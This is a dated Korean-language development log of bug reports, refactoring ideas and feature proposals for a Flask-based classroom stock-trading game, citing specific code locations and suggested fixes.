### 제거/단순화할 것들

- **`resume_room()` 에서 `_ending_soon` 집합 미정리 — 1분 카운트다운 후 재개하면 다음 종료 버튼 즉시 종료** (`app.py:503-517`, `app.py:527`): `end_room()` 에서 종료 카운트다운을 시작하면 `_ending_soon.add(rid)` 가 실행됨 (`app.py:532`). 이후 `pause_room()` + `resume_room()` 을 거쳐도 `_ending_soon` 에서 해당 `rid` 가 제거되지 않음. 결과적으로 재개 후 진행자가 다시 '종료' 버튼을 클릭하면 `app.py:527` 의 `rid not in _ending_soon` 조건을 통과하지 못해 1분 카운트다운 없이 즉시 `_end_room()` 이 호출됨. `resume_room()` 함수 내 `db.session.commit()` 직후에 `_ending_soon.discard(rid)` 한 줄만 추가하면 해결.

- **`get_rankings()` 가 멤버 수 × 보유 종목 수만큼 DB 쿼리 발생** (`app.py:808-824`): `member_total_value(rid, m.user_id)` (`app.py:107-118`) 는 멤버별로 `RoomHolding.query.filter_by(...)`, `Deposit.query.filter_by(...)` 쿼리를 개별 실행. 학생 30명 × 평균 5종목 보유 = 폴링 1회당 최소 90+ DB 쿼리 발생. `RoomHolding.query.filter_by(room_id=rid).all()` 로 전체 보유 데이터를 한 번에 가져와 `user_id` 기준으로 Python dict에 집계하면 쿼리 수를 O(1)로 줄임. `Deposit` 도 동일하게 일괄 조회 가능. `host_members()` (`app.py:542`) 도 같은 패턴이므로 `member_total_value` 를 bulk 버전으로 리팩터링하면 두 엔드포인트 모두 개선.

- **`get_history()` 가 캐시 만료(120초)마다 완전히 다른 랜덤 차트 생성** (`stock_service.py:281-309`): `random.gauss()` 로 매번 새 가격 경로를 생성하므로 두 학생이 다른 시점에 같은 종목 차트를 열면 전혀 다른 그래프를 봄. 수업 중 "이 종목 차트 봐봐" 발언이 의미 없어짐. 시드를 고정(`random.seed(f"{symbol}-{period}-{int(time.time()//120)}")`)해 동일 120초 윈도우 내 모든 요청이 동일한 시드로 생성된 차트를 반환하도록 수정하면 일관성 확보. 시드를 시간 블록 기반으로 하면 주기적으로 자연스럽게 갱신됨.

- **룰렛 베팅 자금 마련 시 `h.shares = 0` 만 설정하고 `db.session.delete(h)` 미호출** (`app.py:1037`): 매도 로직(`app.py:762`)은 `holding.shares == 0` 이면 `db.session.delete(holding)` 을 실행하지만, 룰렛 베팅 자금 마련 코드(`app.py:1032-1044`)는 `h.shares = 0; h.avg_price = 0` 만 설정하고 레코드를 삭제하지 않음. 게임 진행 중 `get_portfolio()` (`app.py:781`) 가 `if h.shares <= 0: continue` 로 필터링하지만 `RoomHolding.query.filter_by(...).all()` 은 0주짜리 레코드도 조회해 불필요한 DB 로드 발생. `h.shares = 0` 설정 직후 `db.session.delete(h)` 를 추가하거나, 일반 매도와 동일한 `holding.shares -= shares; if holding.shares == 0: db.session.delete(holding)` 패턴으로 통일.

- **`_quiz_settings` 및 `_roulette_config` 딕셔너리가 Render 재기동 시 초기화** (`app.py:1246-1247`, `app.py:250-251`): 두 딕셔너리 모두 인메모리 상태이므로 Render 무료 플랜의 슬립 재기동 시 진행자가 게임 전 설정한 퀴즈 보상/패널티 비율과 룰렛 확률이 기본값으로 초기화됨. `Room` 모델에 `quiz_reward_pct FLOAT DEFAULT 1.0`, `quiz_penalty_pct FLOAT DEFAULT 0.5`, `roulette_config VARCHAR(200) DEFAULT NULL` 컬럼을 추가하거나, 최소한 게임 시작(`start_room()`) 시점에 현재 인메모리 설정을 `Room` 테이블에 스냅샷하는 방식으로 재시작 후 복구 가능하게 개선 권장. ALTER TABLE 마이그레이션은 `app.py:31-40` 의 기존 패턴 그대로 사용 가능.

---

## 2026-07-12

### 추가하면 좋을 기능

- **4xx 응답 본문 파싱 미흡 — 실제 오류 메시지 표시 안 됨** (`static/js/app.js:30-43`): `api.get()` / `api.post()` 에서 `if (!r.ok) return {error: 'HTTP ${r.status}'}` 패턴이 서버가 보내는 한국어 오류 본문 전체를 버림. 예를 들어 거래 시 잔액 부족이면 백엔드는 `{"error": "잔액 부족 — 필요: 1,000,000원 / 보유: 500,000원"}` (app.py:749)를 보내지만 학생 화면에는 "HTTP 400"만 뜸. `if (!r.ok) { try { return await r.json(); } catch { return {error: 'HTTP ' + r.status}; } }` 로 두 줄만 바꾸면 모든 거래·퀴즈·복권 오류 메시지가 정확히 표시됨. 가장 빠르게 교실 UX를 개선할 수 있는 수정.

- **강퇴를 게임 진행 중에도 허용** (`app.py:564-575`): `kick_member()` 는 `room.status != 'waiting'` 이면 400을 반환(app.py:570). 게임 중 불공정 거래를 하는 학생을 제거하려면 교사가 게임 전체를 종료해야 함. `waiting` 상태 제한을 제거하고, 게임 중 강퇴 시 보유 주식 현재가 청산 후 `RoomMember`·`RoomHolding` 삭제, `_invalidate_room_cache()` 호출을 추가하면 수업 중 유연한 대처 가능.

- **예금 건수 상한 추가** (`app.py:878-902`): `create_deposit()` 에 active 예금 건수 검사가 없어 학생 1명이 1원짜리 예금을 수만 건 생성해 서버 응답을 느리게 하거나 순위 계산(`member_total_value()` 의 Deposit 조회)에 부하를 줄 수 있음. `Deposit.query.filter_by(room_id=rid, user_id=user.id, status='active').count() >= 10` 조건을 app.py:887 직전에 추가해 건수를 제한하는 것으로 해결.

- **차트가 실제 게임 가격 히스토리와 무관** (`stock_service.py:281-310`): `get_history()` 는 현재가에서 역방향 랜덤워크를 즉석 생성해 반환하므로 학생이 "1개월 차트"를 보면 게임 중 실제로 발생한 가격 변동이 아닌 매번 다른 임의 데이터가 표시됨. `StockService.__init__()` 에 `self._price_log: list = []` 를 추가하고 `get_price()` 내 가격 갱신 시 `(time.time(), new_price)` 를 기록해 `get_history()` 가 해당 로그를 반환하도록 수정하면, 학생들이 "뉴스 → 주가 반응"을 차트에서 직접 확인할 수 있어 교육 효과가 높아짐.

- **결과 화면에서 새 게임 참여 경로 없음** (`app.js:99-112`, `static/index.html` `screen-results`): 게임이 끝나고 결과 화면을 본 뒤 로그아웃 없이 새 게임에 참여하는 버튼이 없음. 같은 수업 내 2회차 게임을 진행하려면 학생들이 각자 새로고침 후 재로그인해야 함. 결과 화면에 "새 게임 참여하기" 버튼을 추가해 `api.post('/api/auth/logout').then(() => { S.user=null; S.room=null; showLanding(); })` 로 이동하면 재로그인 없이 연속 진행 가능.

---

### 제거/단순화할 것들

- **`host_members()`·`get_rankings()` N+1 쿼리** (`app.py:542-561`, `app.py:808-824`): 학생 30명 기준으로 순위 갱신 1회마다 `member_total_value()` 가 학생당 `RoomMember` + `RoomHolding` + `Deposit` 조회를 반복해 90회 이상 쿼리가 발생. `RoomHolding.query.filter_by(room_id=rid).all()` 와 `Deposit.query.filter_by(room_id=rid, status='active').all()` 로 전체를 한 번에 조회한 뒤 `{user_id: [rows]}` dict 로 그룹핑하면 총 쿼리를 3~4회로 줄임. Render 무료 티어에서 DB I/O 병목을 가장 크게 완화할 수 있는 수정.

- **참가자 폴링(10초)과 뉴스 폴링(8초)이 별도 interval** (`app.js:613`, `app.js:810`): 두 `setInterval` 이 독립적으로 실행되어 참가자 1명당 평균 0.22 req/s(10초 룸 상태 + 8초 뉴스)가 발생. 뉴스 데이터를 `/api/rooms/<rid>` 응답(app.py:278-305, `room_dict()`)에 포함하거나, 뉴스 전용 폴링을 룸 상태 폴링 내부 조건으로 통합하면 API 호출 약 40% 절감. 학생 수가 많을수록 효과 큼.

- **퀴즈·룰렛 설정·복권 진행 상태가 모두 서버 메모리에만 존재** (`app.py: _quiz_state`, `_quiz_settings`, `_roulette_config`, `_lots`): Render 무료 티어는 비활성 15분 후 인스턴스를 슬립시키는데, 재시작 시 진행 중인 복권 번호 입력 상태(`_lots[rid]['current']`)·학생별 퀴즈 쿨다운·룰렛 배율 설정이 모두 초기화됨(`_lots` 는 `lottery_rounds_done` 으로 부분 복구되지만 `current` 는 복구 불가). 가장 단순한 해결책: `_roulette_config` 와 `_quiz_settings` 를 Room 테이블에 JSON 컬럼으로 추가해 POST 시 DB에 저장.

- **`Room.query.get_or_404(rid)` 전면 사용** (`app.py` 전반 36곳): Flask-SQLAlchemy 3.x 에서 레거시 `Query.get()` 은 deprecated. `db.get_or_404(Room, rid)` (Flask-SQLAlchemy ≥3.0) 또는 `db.session.get(Room, rid)` 로 순차 교체 필요. 기능 영향 없이 경고 제거 가능.

- **룰렛 60초 자동 닫힘이 남은 스핀을 강제 소멸** (`app.js:972-997`, `openRouletteModal()`): 룰렛 모달이 열리면 60초 카운트다운 후 `closeRoulette()` 를 자동 호출. 스핀 3회 중 1회만 돌린 채 60초가 지나면 나머지 2회가 소멸되고, `closeRoulette()` 가 `minigame/close` 를 호출해 게임이 종료로 이어질 수 있음. 자동 닫힘을 제거하거나, 남은 스핀이 0이 될 때만 자동 닫힘을 트리거하도록 조건 추가 필요.

---

## 2026-07-12 (2차)

### 추가하면 좋을 기능

- **시장 탭 종목 정렬 기준 선택 UI** (`app.js:1257-1270`, `filterStocks()`): 현재 종목은 서버 `STOCKS` dict 삽입 순서 그대로 표시되며 정렬 컨트롤이 없음. `<select>`로 "변동률 높은 순 / 낮은 순 / 현재가 높은 순 / 이름 순" 옵션을 추가하고 `renderGrid()` 직전에 `filtered.sort((a,b) => ...)` 를 적용하면 학생이 급락 종목을 바로 찾을 수 있음. 서버 변경 불필요, 클라이언트 전용 수정.

- **포트폴리오 자산 변화 차트에 시작 자금 기준선 추가** (`app.js:1505-1540`, `loadPortfolio()`): `assetLineChart` 에 손익 기준선이 없어 학생이 수익 여부를 시각적으로 파악하기 어려움. `datasets` 에 `{ data: S.assetHistory.map(() => starting), borderColor:'rgba(239,68,68,0.4)', borderDash:[5,5], borderWidth:1, pointRadius:0, fill:false, label:'시작 자금' }` 를 추가하면 break-even 라인이 표시되어 수익/손실 구간이 즉시 구분됨.

- **게임 방 최대 인원 제한 설정** (`models.py:25-44`, `app.py:392-406`): `Room` 모델에 `max_members` 컬럼이 없어 방 생성 후 학생이 무제한으로 입장 가능. `max_members = db.Column(db.Integer, default=100)` 를 추가하고, 스타트업 마이그레이션 블록에 `ALTER TABLE rooms ADD COLUMN max_members INTEGER DEFAULT 100` 을 포함. `join_room()` 에서 `RoomMember.query.filter_by(room_id=room.id).count() >= room.max_members` 검사 추가. 방 생성 UI에는 기본값 35 입력란 추가.

- **학생 이름 입장 후 수정 기능** (`app.py:329-342`): 학생이 이름을 오입력한 경우 로그아웃 후 재입장 외에 수정 방법이 없음. `PATCH /api/auth/username` 엔드포인트를 추가해 `user.username = new_username; db.session.commit()` 처리하고 `IntegrityError` 시 400 반환. 모든 게임 데이터는 `user_id` 기준이므로 이름 변경이 기존 포지션·거래 내역에 영향을 주지 않음.

- **룰렛 꽝 확률 0% 방지** (`app.py:1372-1383`, `app.js:956-969`): `host_roulette_config()` 는 `sum(weights) != 0` 만 검사하므로 `weights[0]=0` 설정이 가능. 꽝이 사라지면 모든 학생이 반드시 배수 수익을 얻어 게임 밸런스가 무너짐. 서버에 `if weights[0] < 1: return jsonify({'error': '꽝 확률은 최소 1 이상이어야 합니다.'}), 400` 추가, UI 의 `rlt-w-0` 입력에 `min="1"` 속성 추가.

- **게임 방 안내사항(description) 필드 추가** (`models.py:25-44`, `app.py:363-390`): 교사가 오늘 세션 규칙("분산 투자 필수", "공매도 금지")을 학생에게 전달할 방법이 없어 구두 설명에 의존. `Room` 에 `description = db.Column(db.String(300), nullable=True)` 추가, `create_room()` 에서 파싱, `room_dict()` 에 포함, 참가자 로비 및 게임 헤더에 표시.

### 제거/단순화할 것들

- **`doSetRltConfig()` 저장 후 룰렛 휠 시각 미갱신** (`app.js:956-969`): `api.post(.../roulette-config, ...)` 성공 시 `_rltMults = data.multipliers; _rltWeights = data.weights` 를 갱신하지만 `updateRltLegend(data.multipliers, data.weights)` 를 호출하지 않아 호스트 화면의 conic-gradient 휠이 이전 확률로 유지됨. `doSetRltConfig()` 의 성공 분기 마지막에 `updateRltLegend(data.multipliers, data.weights)` 한 줄 추가로 해결 가능.

- **`enterParticipantGame()` 에서 `S.assetHistory` 미초기화** (`app.js:593`): `showLanding()` (line 94) 에서는 `S.assetHistory = []` 를 초기화하지만, 새로고침 후 `resumeRoom()` (lines 171-181) 이 `showLanding()` 을 거치지 않고 `enterParticipantGame()` 을 직접 호출. 이전 세션에서 쌓인 `assetHistory` 배열이 남아 있어 포트폴리오 차트에 이전 세션 데이터가 앞에 붙음. `enterParticipantGame()` 시작 지점에 `S.assetHistory = [];` 를 추가하면 재진입 시에도 항상 클린 상태 보장.

- **`force_sector_event()` 가 `_current_biases` 갱신 없음** (`stock_service.py:244-276`): 호스트가 섹터 이벤트를 트리거하면 해당 종목의 가격과 뉴스는 즉시 변동되지만 `_current_biases` 는 이전 값 그대로. 이후 자동 price tick 이 이전 방향 bias 로 움직여 이벤트 방향과 역행할 수 있음. `return affected` (line 275) 직전에 `for sym in affected: self._current_biases[sym] = direction` 을 추가해 다음 tick 방향을 이벤트와 일치시킴.

- **`host_adjust()` 에 `room.status` 검증 없음** (`app.py:587-603`): `room.host_id != user.id` 만 검사하므로 게임 종료 후에도 교사가 `POST /api/rooms/<rid>/host/adjust` 를 호출해 학생 현금을 수정할 수 있음. 수정 후 결과 엑셀을 다시 내려받으면 변조된 수치가 반영됨. `app.py:592` 에 `if room.status == 'ended': return jsonify({'error': '종료된 게임은 조정할 수 없습니다.'}), 400` 추가.

- **`refreshMyRank()` 에 fetch 예외 미처리** (`app.js:735-753`): `await api.get(...)` 에서 네트워크 단절 시 `fetch()` 가 throw하는데 `setInterval` 콜백 내에 try/catch 가 없어 unhandled rejection 이 발생. 이후 같은 콜백 내의 `loadMarket()` · `loadParticipantRankings()` 호출도 건너뜀. `api.get(...)` 호출을 `await api.get(...).catch(() => null)` 로 바꾸고 결과가 null 이면 즉시 return 처리.

- **`minigame_open()` 에서 `_rlt_lock` 보유 중 `db.session.commit()` 호출** (`app.py:948-955`): `with _rlt_lock:` 블록 내부(line 952-954)에서 `room.status='paused'; db.session.commit()` 을 실행. SQLite busy_timeout(5000ms)만큼 DB I/O 가 지연될 경우 `_rlt_lock` 을 기다리는 다른 스레드(`minigame_close()` 등)가 5초 블로킹됨. lock 블록 안에서는 `should_pause` 불리언만 판별하고, lock 종료 후 `room.status='paused'; db.session.commit()` 을 실행하도록 리팩터링.

## 2026-07-13

### 추가하면 좋을 기능

- **QR 스캔 후 방 코드 자동 입력** (`app.js:195-206`, `index.html:319-321`): `_makeQR()`에서 URL에 `?code=XXXXXX` 쿼리 파라미터를 포함하지만 (`app.js:197`), 페이지 로드 시 해당 파라미터를 파싱해 `join-code` 입력 필드에 자동으로 채우는 로직이 없음. `DOMContentLoaded` 이벤트에 `const c = new URLSearchParams(location.search).get('code'); if(c) document.getElementById('join-code').value = c.toUpperCase(); showScreen('screen-join');` 추가 시 QR 스캔 즉시 입장 화면으로 이동하고 코드가 자동 입력됨.

- **호스트가 복권 전체 결과를 게임 종료 후에도 조회 가능하도록** (`app.py:1113-1147`): 복권 결과(`_lots[rid]['current']['results']`)가 in-memory에만 존재해 모달 닫으면 사라짐. 게임 종료 시 `_end_room()`에서 복권 결과를 `RoomTransaction`에 'LOTTO_SUMMARY' 노트로 저장(`app.py:120-163`)하거나, 호스트 결과 화면에 복권 당첨자 요약 섹션을 추가하면 수업 후 피드백에 활용 가능.

- **`host/adjust` 엔드포인트에 게임 종료 후 잠금** (`app.py:587-603`): `room.host_id != user.id` 만 검사하므로 `room.status == 'ended'` 인 방에도 `POST /api/rooms/<rid>/host/adjust` 호출이 허용됨. 조정 후 엑셀 재다운로드 시 변조된 순위가 반영될 수 있음. `app.py:593` 직후에 `if room.status == 'ended': return jsonify({'error': '종료된 게임은 자산 조정이 불가합니다.'}), 400` 추가.

- **`_quiz_settings` · `_roulette_config` 데이터베이스 영속화** (`app.py:250-252, 1245-1246`): Render free tier는 15분 무활동 시 프로세스가 종료(spin-down)되어 in-memory dict 전체 초기화. 게임 도중 설정한 퀴즈 보상률·룰렛 확률이 서버 재시작 후 기본값으로 복귀. `Room` 테이블에 `quiz_reward_pct FLOAT`, `quiz_penalty_pct FLOAT`, `rlt_config JSON(String)` 컬럼 추가 후 마이그레이션 블록(`app.py:31-40`)에 ALTER 문 추가, `quiz_settings()`·`host_roulette_config()` 에서 DB 읽기/쓰기로 변경.

- **참가자 게임 진입 시 URL 기반 방 직접 접속 지원** (`app.js:82-90`): 현재 `resumeRoom()`이 `session`에 저장된 방을 자동 복원하지만, 새 시크릿 브라우저에서 QR로 접속 시 로그인→코드 입력 두 단계가 필요. `/join?code=XXXX` 경로를 처리하는 로직에서 코드가 있으면 로그인 화면 건너뛰고 방 참가 화면 선표시(`showScreen('screen-join')`)하면 스마트폰에서 원클릭 입장 가능.

- **호스트 대시보드에 참가자 접속 현황 실시간 표시** (`app.py:542-562`, `app.js:408-431`): 게임 중 탭 전환 없이 참가자 수 및 최근 접속 시각을 순위 탭에 함께 표시하면 학생이 게임에서 이탈(탭 닫기 등)했는지 파악 가능. `RoomMember`에 `last_seen_at` 컬럼 추가, `/api/rooms/<rid>/portfolio` 또는 `/api/rooms/<rid>` 호출 시 갱신, 호스트 멤버 목록에 "(5분 전 접속)" 표시 추가.

### 제거/단순화할 것들

- **`_set_sqlite_pragmas` PostgreSQL 환경 오류 가능성** (`app.py:18-29`): `_sa_event.listen(db.engine, "connect", _set_sqlite_pragmas)` 가 DB 종류 무관하게 등록됨. `DATABASE_URL` 환경변수가 `postgresql://`로 시작하면 `PRAGMA journal_mode=WAL` 등이 PostgreSQL에서 오류를 발생시킴. `app.py:29` 를 `if 'sqlite' in app.config['SQLALCHEMY_DATABASE_URI']: _sa_event.listen(db.engine, "connect", _set_sqlite_pragmas)` 로 변경해 조건 분기 필요.

- **`member_total_value()` 반복 호출 N+1 쿼리** (`app.py:107-118`): `get_rankings()` (line 815), `host_members()` (line 554), `export_rankings()` (line 1432)에서 모든 멤버에 대해 각각 `RoomHolding.query.filter_by(room_id=rid, user_id=uid)` + `Deposit.query.filter_by(room_id=rid, user_id=uid)` 를 실행. 30명 방 기준 ranking 요청 한 번에 60개 이상 쿼리 발생. `RoomHolding.query.filter_by(room_id=rid).all()` 과 `Deposit.query.filter_by(room_id=rid, status='active').all()` 을 방 전체에 대해 한 번씩 조회하고, `user_id` 기준으로 파이썬에서 집계하면 쿼리 수를 2-3개로 줄일 수 있음.

- **`_ending_soon` set 서버 재시작 시 소실** (`app.py:90, 527-535`): 호스트가 종료 요청 시 `room.end_time`이 `now + 60초`로 단축되지만 이 정보가 DB에는 반영됨. 그러나 `rid`를 `_ending_soon` set에만 추가하므로 서버 재시작 시 set이 초기화되어 `end_time`이 60초 이내임에도 `ending_soon` 플래그가 내려가지 않음. `room_dict()`에서 `_ending_soon`을 참조하는 대신 `room.end_time` vs `datetime.utcnow() + timedelta(seconds=70)` 비교로 대체하면 서버 재시작 내성 확보 가능.

- **`find_active_room()` 추가 쿼리 낭비** (`app.py:307-313`): `RoomMember.query.join(Room).filter(...).first()` 로 멤버를 찾은 뒤 `db.session.get(Room, m.room_id)` 로 Room을 다시 조회. `join()` 시 이미 `Room` 인스턴스를 로드하므로 `RoomMember.query.join(Room, ...).with_entities(Room).filter(...).first()` 패턴으로 Room을 바로 반환하면 왕복 쿼리 1회 절약.

- **룰렛 설정 테이블 칸 색상과 실제 휠 색상 불일치** (`index.html:276-300`, `app.js:905`): 호스트 설정 UI의 "2칸"은 `#e67e22`(주황), "3칸"은 `#f1c40f`(노랑)인데, `_RLT_COLORS = ['#e74c3c','#3498db','#f39c12','#2ecc71','#9b59b6']` 에서 인덱스 1이 파란색(`#3498db`)으로 매핑됨. 교사가 확률 편집 시 색상 기준으로 결과 구분 불가. `index.html`의 인라인 색상을 `_RLT_COLORS` 값과 맞추거나 `_RLT_COLORS` 배열을 HTML 색상과 통일.

- **`loadDepositsPage()` 에서 portfolio API 중복 호출** (`app.js:1621-1644`): `showPage('deposit')` 시 `loadDepositsPage()` 가 `api.get('/portfolio')` 와 `api.get('/deposits')` 를 순차 호출. 같은 폴링 사이클에서 이미 portfolio를 가져온 경우에도 재호출. `S.depCash` 를 `refreshMyRank()` 의 `total_value` 기반 데이터에서 업데이트하거나, portfolio 응답 캐시를 활용하면 예금 탭 진입마다 발생하는 불필요한 portfolio 요청 1건 제거.

---

## 2026-07-13 (2차)

### 추가하면 좋을 기능

- **호스트가 학생별 포트폴리오 직접 조회** (`app.py:772-803`, `app.js:408-431`): 호스트 순위 탭에서 학생 자산 총액만 보이고, 어느 종목에 얼마나 투자했는지는 표시되지 않아 "왜 순위가 이렇게 됐는가"를 수업에서 설명하기 어려움. `GET /api/rooms/<rid>/host/members/<uid>/portfolio` 엔드포인트를 추가하고(호스트 권한 체크 후 `get_portfolio()` 로직 그대로 재사용), 호스트 멤버 행 클릭 시 해당 학생의 보유 종목·수익률 모달을 표시하면 수업 시연에 활용 가능.

- **종목 카드에 전체 참여자 보유 인원 표시** (`app.py:651-671`, `app.js:1287-1311`): 특정 종목에 몇 명이 투자 중인지 알 수 없어 교사가 군집 투자(쏠림 현상)를 파악하기 어려움. `get_stocks()` 응답에 각 종목별 `holder_count` 필드를 추가(`RoomHolding.query.filter_by(room_id=rid, symbol=sym).count()` 집계)하고 `stock-card` 하단에 "👥 3명 보유" 표시를 추가하면 분산 투자 토론 시 교육 자료로 활용 가능.

- **포트폴리오 탭에 분산 투자 집중도 지표 표시** (`app.js:1456-1566`): 학생이 한 종목에 전 자산을 몰아넣어도 시각적으로 인지하기 어려움. `loadPortfolio()` 내에서 `max_pct = Math.max(...data.holdings.map(h => h.current_value / data.total_value * 100))` 를 계산한 뒤, 60% 이상이면 "🔴 집중 위험", 30~60%면 "🟡 보통", 30% 미만이면 "🟢 분산 양호" 배지를 포트폴리오 상단 요약에 추가. 서버 변경 없이 클라이언트 전용으로 구현 가능.

- **게임 방 설정 복사 기능** (`app.js:121-140`, `app.py:363-390`): 교사가 동일 설정(시간, 시작 자금, 금리)으로 여러 반을 연속 운영할 때 매번 입력값을 다시 채워야 함. 결과 화면(screen-results)에 "같은 설정으로 새 방 만들기" 버튼을 추가해 `S.room.duration_minutes`, `S.room.starting_cash`, `S.room.deposit_rate` 를 URL 파라미터 또는 localStorage 에 저장 후 방 생성 화면으로 이동할 때 자동 입력하면 재사용이 편리함.

- **포트폴리오 탭 폴링 미구현** (`app.js:613-650`): `enterParticipantGame()` 의 10초 폴링 루프(line 648)에서 `if (S.currentPage === 'market') loadMarket()` 은 있지만 `portfolio` 탭에 대한 자동 갱신이 없음. 학생이 포트폴리오 탭을 열어 놓은 상태에서 호스트가 강제 가격 변동을 발생시켜도 보유 종목 평가 금액이 갱신되지 않음. `if (S.currentPage === 'portfolio') loadPortfolio()` 를 같은 폴링 블록에 추가해 10초마다 실시간 갱신.

- **퀴즈 결과 교사 화면 실시간 집계** (`app.py:1270-1342`, `app.js:828-895`): 교사(호스트) 화면에 퀴즈 정답률·오답자 명단이 표시되지 않아 수업 중 학생 이해도 파악이 불가. `_quiz_state` 딕셔너리를 순회해 퀴즈 결과 요약(`GET /api/rooms/<rid>/host/quiz-stats`)을 제공하거나, `RoomTransaction` 에 기록된 퀴즈 보상/패널티 ADJ 거래 내역을 집계하면 교사 화면에 "정답 12명 / 오답 5명" 형태로 표시 가능.

### 제거/단순화할 것들

- **`get_rankings()` 에서 User None 시 AttributeError 충돌** (`app.py:818`): `u = db.session.get(User, m.user_id)` 후 `'username': u.username` 을 바로 사용. 사용자가 DB에서 삭제된 경우 `NoneType has no attribute 'username'` 로 500 오류 발생. 동일 파일의 `host_members()` (line 557)에는 `u.username if u else str(m.user_id)` 가드가 있으나 `get_rankings()` 에는 누락됨. `'username': u.username if u else str(m.user_id)` 로 통일.

- **`export_rankings()` 에서도 User None 가드 누락** (`app.py:1435`): `u = db.session.get(User, m.user_id)` 후 `parts = u.username.split(' ', 1)` 를 직접 호출. `u` 가 None 이면 `AttributeError` 로 500 응답이 반환되어 Excel 다운로드 실패. `username = u.username if u else str(m.user_id); parts = username.split(' ', 1)` 으로 수정.

- **`create_room()` 에서 int/float 변환 예외 미처리** (`app.py:384-386`): `int(d.get('duration_minutes', 30))`, `float(d.get('starting_cash', 10_000_000))`, `float(d.get('deposit_rate', 3.0))` 가 모두 try/except 없이 실행됨. API를 직접 호출할 때 `duration_minutes: "abc"` 와 같은 비정상 값이 들어오면 `ValueError` 로 500 오류. `try: ... except (TypeError, ValueError): return jsonify({'error': '잘못된 입력값 형식'}), 400` 으로 각각 감싸거나 일괄 처리.

- **`force_price()` 가 `_current_biases` 갱신하지 않음** (`stock_service.py:231-241`): 호스트가 종목을 강제로 상승/하락시키면 뉴스와 가격은 즉시 반영되지만 `self._current_biases[symbol]` 는 갱신되지 않음. 이후 자동 가격 tick 시 이전 bias 방향으로 움직여 강제 이벤트와 반대 방향으로 가격이 역행할 수 있음. `return new_price` 직전에 `self._current_biases[symbol] = 'up' if pct > 0 else 'down'` 한 줄 추가로 해결 가능. (유사한 `force_sector_event()` 문제는 2026-07-12(2차)에 보고됨; `force_price()` 만 미수정.)

- **`get_quiz()` 및 `submit_quiz()` 에 참여자 검증 없음** (`app.py:1248-1268`, `app.py:1270-1342`): `@login_required` 만 있고 `RoomMember` 체크가 없어 방 ID를 아는 사람이면 누구나 퀴즈 보상을 받을 수 있음. 호스트도 퀴즈를 사용해 자신의 자산을 늘릴 수 있음(호스트는 `RoomMember` 가 아니므로 `member.cash` 갱신 시 `None` 이 반환되어 실제로는 영향 없지만, `_quiz_state` 에 불필요한 상태가 쌓임). `app.py:1254` (get_quiz)와 `app.py:1278` (submit_quiz) 직후에 `member = RoomMember.query.filter_by(room_id=rid, user_id=user.id).first(); if not member: return jsonify({'error': '참여자가 아닙니다.'}), 403` 추가.

- **`withdraw_deposit()` 에서 RoomTransaction 미기록** (`app.py:904-916`): 예금 조기 해지 시 `dep.status = 'withdrawn'; m.cash += dep.amount` 는 처리되지만 `RoomTransaction` 레코드가 없음. 교사가 `host/members/<uid>/transactions` 에서 특정 학생의 거래 내역을 확인할 때 예금 해지 이벤트가 보이지 않아 자산 이력 추적에 공백이 생김. `db.session.add(RoomTransaction(room_id=rid, user_id=user.id, symbol='DEPOSIT', action='ADJ', shares=0, price=0, amount=dep.amount, note='예금 조기 해지 — 이자 없이 원금 반환'))` 를 `db.session.commit()` 직전에 추가.

---

## 2026-07-14

### 추가하면 좋을 기능

- **복권 번호 자동 선택 버튼** (index.html:484, app.js `doSubmitLotteryPick` 관련): 참가자 복권 UI(`lottery-picker-section`)에 "자동 선택" 버튼이 없어 학생들이 60초 타이머 내에 손으로 6개 숫자를 고르다 시간 초과가 빈번함. `Array.from({length:45},(_,i)=>i+1).sort(()=>Math.random()-0.5).slice(0,6).sort((a,b)=>a-b)` 로 랜덤 번호 채운 뒤 `_lotParticipantPicks`에 바로 넣는 버튼 한 개로 해결. 서버 변경 불필요, JS 10줄 이내. 이전 분석(2026-06-23)에서도 지적됐으나 여전히 미구현 — 파급 효과가 가장 큰 미해결 항목.

- **방 코드 URL 파라미터 자동 입력** (app.js:196, index.html:319): QR 코드 생성 시 `?code=${S.room.code}` 파라미터를 붙이지만 (app.js:196 `joinUrl = ${location.origin}${location.pathname}?code=${S.room.code}`), join 화면 진입 시 `new URLSearchParams(location.search).get('code')`로 `join-code` 필드를 자동 채우는 코드가 없음. QR 스캔 후에도 학생이 코드를 다시 입력해야 하는 불편함. `DOMContentLoaded` 또는 `showScreen('screen-join')` 직전에 5줄 추가로 해결.

- **진행자용 텍스트 공지 방송 기능** (app.py 신규 엔드포인트, index.html 설정 탭): 진행자가 폭탄뉴스(주가 연동)와 별개로 자유로운 텍스트 공지를 전체 참가자에게 보낼 방법이 없음. `Room` 모델에 `notice_text` + `notice_ts` 컬럼 추가, `GET /api/rooms/<rid>` 응답에 포함, 클라이언트 폴링에서 `notice_ts` 변화 감지 시 배너 표시. 수업 중 "지금 삼성전자 주목!", "3분 후 복권 시작" 등 실시간 안내에 활용 가능.

- **진행자 퀴즈 답변 통계 표시** (app.py `_quiz_state`, 진행자 설정 탭): `_quiz_state` 딕셔너리에 `(rid, uid)` 별 결과가 메모리에 있지만, 진행자가 "방 전체 정답률"을 볼 방법이 없음. `GET /api/rooms/<rid>/host/quiz-stats` 엔드포인트로 `{correct: N, wrong: N, unanswered: N}` 반환하고 설정 탭 하단에 간단 표시. 수업 토론 포인트 생성에 유용.

- **관심종목 가격 급변 토스트 알림** (app.js:1257~1324 `filterStocks`, `renderGrid`): 현재 `S.watchlist`에 등록한 종목이 있어도 가격 급등락 알림이 없음. `renderGrid()` 내 flash 애니메이션 로직(app.js:1312~1323) 실행 시 `S.watchlist.has(st.symbol) && Math.abs(st.change_pct) > 5` 조건이면 `toast('⭐ ${st.name} ${pct(st.change_pct)}', 'info')` 추가. 서버 변경 불필요.

- **결과 화면 개인 거래 내역 섹션** (app.js `loadResults()`, screen-results): 게임 종료 후 결과 화면(screen-results)에 순위표와 차트만 있고 본인의 거래 내역이 없어 학생이 "내가 무슨 거래를 했는지" 복기 불가. `GET /api/rooms/<rid>/transactions?page=1`를 결과 화면 진입 시 호출해 최근 10건 표시하면 수업 마무리 토론 소재가 됨. 엔드포인트는 이미 존재(app.py:829).

### 제거/단순화할 것들

- **`startNewsPolling` 폴링 주기 하드코딩** (app.js:810): 뉴스를 무조건 8초(`setInterval(..., 8000)`)마다 폴링하지만, 진행자가 `news_seconds=5`로 줄이면 클라이언트는 여전히 8초마다 확인해 뉴스를 최대 3초 늦게 보여줌. `loadNewsInterval()` 반환값을 사용해 `Math.min(8000, data.news_seconds * 1000)` 으로 동적 조정하거나, 서버에서 `news_seconds`가 8초 이하일 때 경고 표시. 간단한 1줄 수정.

